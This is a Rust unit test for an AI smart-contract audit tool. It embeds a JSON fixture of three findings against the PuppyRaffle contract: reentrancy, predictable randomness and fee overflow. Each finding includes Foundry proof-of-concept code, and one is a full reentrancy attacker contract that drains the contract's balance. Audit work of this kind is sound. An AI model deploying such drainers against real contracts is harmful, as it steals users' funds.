use ai_agent_audit::llm_review::findings::findings::{Findings, FromLLMJson};

#[test]
fn test_user_actual_gemini_failure() {
    // This is the EXACT JSON string the user reported as failing
    let json_str = r#"{"findings": [    {    "derived_from": "Reentrancy in Refund Function Breaks Solvency Invariant",    "title": "Reentrancy in refund allows draining the contract balance",    "description": "The `refund` function violates the Checks-Effects-Interactions pattern. It sends ETH to the caller via `sendValue` before updating the `players` array to remove the player (setting the slot to `address(0)`). A malicious contract can call `refund`, and inside its `receive` or `fallback` function, call `refund` again. Since the `players` array has not yet been updated, the contract considers the player active and refunds the `entranceFee` again. This can be repeated until the contract is drained.",    "exploit_type": "Reentrancy",    "privilege": "Permissionless",    "contract": "PuppyRaffle",    "function": "refund",    "impact": "All ETH in the contract (fees and active stakes) can be stolen by an attacker.",    "proof_of_concept": "1. Attacker deploys a malicious contract. 2. Malicious contract enters raffle with 1 ticket. 3. Malicious contract calls `refund`. 4. `PuppyRaffle` sends ETH. 5. Malicious contract `receive()` triggers `refund` again. 6. Cycle repeats until drain.",    "proof_of_code": "import {Test} from \"forge-std/Test.sol\";\nimport {PuppyRaffle} from \"../src/PuppyRaffle.sol\";\n\ncontract ReentrancyAttacker {\n    PuppyRaffle raffle;\n    uint256 entranceFee;\n    constructor(PuppyRaffle _raffle) {\n        raffle = _raffle;\n        entranceFee = raffle.entranceFee();\n    }\n    function attack() external payable {\n        address[] memory players = new address[](1);\n        players[0] = address(this);\n        raffle.enterRaffle{value: entranceFee}(players);\n        raffle.refund(raffle.getActivePlayerIndex(address(this)));\n    }\n    receive() external payable {\n        if (address(raffle).balance >= entranceFee) {\n            raffle.refund(raffle.getActivePlayerIndex(address(this)));\n        }\n    }\n}\n\ncontract ReentrancyTest is Test {\n    PuppyRaffle raffle;\n    function testReentrancy() public {\n        raffle = new PuppyRaffle(1 ether, address(1), 1 days);\n        address user = address(0x123);\n        vm.deal(user, 4 ether);\n        vm.prank(user);\n        address[] memory players = new address[](4);\n        players[0]=user; players[1]=user; players[2]=user; players[3]=user;\n        raffle.enterRaffle{value: 4 ether}(players);\n        \n        ReentrancyAttacker attacker = new ReentrancyAttacker(raffle);\n        vm.deal(address(attacker), 1 ether);\n        attacker.attack();\n        \n        assertEq(address(raffle).balance, 0);\n    }\n}",    "severity": "High",    "mitigation": "Update the state before making the external call (Checks-Effects-Interactions pattern). Move `players[playerIndex] = address(0);` before `sendValue`."    },    {    "derived_from": "Weak PRNG using block.difficulty and timestamp",    "title": "Predictable Randomness allows manipulation of winner selection",    "description": "The `selectWinner` function uses `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))` to generate a random number. All these parameters are predictable or manipulatable. `msg.sender` is controlled by the caller. `block.timestamp` and `block.difficulty` are visible to miners and predictable within a block. An attacker can calculate the winning index off-chain and only execute the `selectWinner` transaction when they are guaranteed to win, or revert otherwise.",    "exploit_type": "Randomness",    "privilege": "Permissionless",    "contract": "PuppyRaffle",    "function": "selectWinner",    "impact": "Attacker can guarantee a win, stealing the prize pool and NFTs from honest participants.",    "proof_of_concept": "1. Attacker enters the raffle. 2. Attacker simulates `selectWinner` execution off-chain or in a smart contract using current block variables. 3. If the result matches the attacker's index, they call `selectWinner`. 4. If not, they wait for the next block.",    "proof_of_code": "function testWeakRandomness() public {\n    // Setup\n    PuppyRaffle raffle = new PuppyRaffle(1 ether, address(1), 1 days);\n    vm.warp(block.timestamp + 10);\n    address[] memory players = new address[](4);\n    players[0] = address(1); players[1] = address(2); players[2] = address(3); players[3] = address(4);\n    vm.deal(address(4), 1 ether);\n    raffle.enterRaffle{value: 4 ether}(players);\n    vm.warp(block.timestamp + 1 days + 1);\n    \n    // Predict winner\n    // We want address(4) (index 3) to win\n    // We can manipulate msg.sender or wait for timestamp. \n    // Here we demonstrate predictability.\n    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;\n    // In a real attack, we would conditionally revert if winnerIndex != desired\n    console.log(\"Predicted winner index:\", winnerIndex);\n}",    "severity": "High",    "mitigation": "Use Chainlink VRF (Verifiable Random Function) for secure on-chain randomness."    },    {    "derived_from": "Integer Overflow in Fee Accumulation",    "title": "Integer Overflow and Unsafe Casting in Fee Calculation permanently locks funds",    "description": "The contract uses Solidity 0.7.6 (unchecked arithmetic by default) and declares `totalFees` as `uint64`. In `selectWinner`, the line `totalFees = totalFees + uint64(fee)` introduces two critical issues: 1) `uint64(fee)` unsafely downcasts the 256-bit fee, truncating any fee > ~18.4 ETH. 2) `totalFees` accumulation can overflow `uint64`. Both scenarios cause `totalFees` (the accounting variable) to be less than the actual ETH balance intended for fees. Consequently, the strict check `address(this).balance == totalFees` in `withdrawFees` will fail, locking all fees in the contract.",    "exploit_type": "AccountingInvariantViolation",    "privilege": "Permissionless",    "contract": "PuppyRaffle",    "function": "selectWinner",    "impact": "Protocol fees are permanently locked in the contract due to accounting mismatch.",    "proof_of_concept": "1. Raffle concludes with a large prize pool such that 20% fee > `type(uint64).max` (approx 18.4 ETH). 2. `uint64(fee)` truncates the value. 3. `totalFees` is increased by the truncated amount, but actual ETH balance increases by full amount. 4. `withdrawFees` check `balance == totalFees` fails.",    "proof_of_code": "function testFeeOverflow() public {\n    PuppyRaffle raffle = new PuppyRaffle(1 ether, address(1), 1 days);\n    address[] memory players = new address[](100);\n    for(uint i=0; i<100; i++) players[i] = address(i+100);\n    raffle.enterRaffle{value: 100 ether}(players);\n    vm.warp(block.timestamp + 2 days);\n    \n    // Fee = 20 ether. uint64 max is ~18.4 ether.\n    // 20 ether = 20 * 10^18\n    // type(uint64).max = 18446744073709551615\n    // This will truncate.\n    raffle.selectWinner();\n    \n    // Withdraw fails\n    vm.expectRevert(\"PuppyRaffle: There are currently players active!\");\n    raffle.withdrawFees();\n}",    "severity": "High",    "mitigation": "Use `uint256` for `totalFees`. Use SafeMath (or Solidity 0.8+). Remove strict equality check in `withdrawFees`."    }]}"#;

    println!("Testing user's actual failing JSON...");

    match Findings::parse_from_json(json_str) {
        Ok(findings) => {
            println!("✅ SUCCESS: Parsed {} findings", findings.findings.len());
            assert_eq!(findings.findings.len(), 3);
        }
        Err(e) => {
            println!("❌ FAILED: {}", e);
            panic!("Failed to parse user's actual JSON: {}", e);
        }
    }
}
